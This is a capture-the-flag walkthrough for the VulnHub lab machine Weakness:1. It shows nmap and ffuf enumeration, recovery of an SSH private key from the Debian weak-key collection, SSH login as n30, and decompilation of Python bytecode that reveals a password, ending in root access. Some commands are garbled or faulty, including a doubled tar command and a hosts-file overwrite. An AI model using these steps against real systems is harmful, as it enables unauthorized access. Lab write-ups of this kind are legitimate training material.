

# Weakness:1 Walkthrough

**VulnHub Link:** [Weakness:1](https://www.vulnhub.com/entry/w34kn3ss-1,270/)
**Difficulty:** Medium 
**Release Date:** 14 Aug 2018

---

## 1. Reconnaissance

### Nmap Scan
```bash
nmap -A -O -T4 -P -sV 192.168.100.169

sudo echo "192.168.100.169    weakness.jth" > /etc/hosts
```

## 2. Web Enumeration
```
ffuf -c -ic -u 'http://weakness.jth/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
/private found

from private we obtain my-key.pub and notes.txt

found out that my-key.pub is ssh_rsa key 

we download debian_rsa_ssh_2048 from https://github.com/g0tmi1k/debian-ssh/blob/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 and --->

```bash
tar -vxf tar -xvf debian_ssh_rsa_2048_x86.tar.bz2

cd rsa/2048
grep -r "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster" .
```

we obtain ssh private key file

```bash
ssh -i 4161de56829de2fe64b9055711f531c1-2537 n30@weakness.jth (we obtain n30 from webpage)
```

n30 shell opened.

we observe that code exist which is python 2.7 byte-complied
we download that file via python server to our machine

```bash
uncomply2 code
```

and we can see username and password

n30:dMASSDNB!#B!#!#33

and BOOOMM...! We are root
